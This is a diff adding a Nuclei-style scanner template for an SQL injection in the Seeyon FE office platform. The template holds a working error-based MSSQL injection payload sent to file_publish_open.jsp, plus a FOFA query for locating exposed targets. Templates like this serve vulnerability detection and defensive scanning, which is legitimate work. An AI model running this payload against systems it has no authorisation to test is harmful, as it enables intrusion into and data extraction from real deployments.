@@ -1,0 +1,31 @@
+id: poc-yaml-seeyon-hulian-fe-file-publish-open-sqli
+info:
+  name: 致远互联FE协作办公平台 file_publish_open SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: 致远互联-FE
+    fofa: app="致远互联-FE"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /document/file_publish_open.jsp?id=%28CONVERT%28INT%2C%28SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))%29%29%29 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [500]
+      - type: word
+        words:
+          - "SQLServerException:"
+      - type: dsl
+        dsl:
+          - contains(body, "转换成数据类型") || contains(gbk_decode(body), "转换成数据类型")
+          - contains(body, "点击关闭，重新操作") || contains(gbk_decode(body), "点击关闭，重新操作")
+          - contains(body, concat("0x", t2))
